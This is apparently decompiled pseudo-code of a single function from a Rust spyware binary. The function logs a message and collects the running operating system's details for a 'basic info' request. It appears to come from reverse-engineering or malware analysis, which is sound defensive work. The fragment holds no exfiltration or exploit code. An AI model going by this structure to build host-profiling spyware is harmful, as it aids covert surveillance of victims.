
  int64_t* spyware::actions::basic_info::get_basic_info_request::h37840dd4820167af(int64_t* arg1)

{
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
    {
        void** const var_38 = &data_4b97e8;
        int64_t var_30_1 = 1;
        int64_t var_28_1 = 8;
        int128_t var_20_1 = {0};
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b97f8);
        char const* const var_60 = "spyware::actions::basic_infoHand…";
        int64_t var_58_1 = 0x1c;
        char const* const var_50_1 = "spyware::actions::basic_infoHand…";
        int64_t var_48_1 = 0x1c;
        int64_t var_40_1 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_38, 4, &var_60);
    }
    
    spyware::actions::basic_info::get_running_os_info::h2ac1d86b9171dd43(arg1);
    arg1[7] = 1;
    *(arg1 + 0x3e) = 1;
    *(arg1 + 0x3c) = 0x101;
    arg1[3] = -0x8000000000000000;
    return arg1;
}
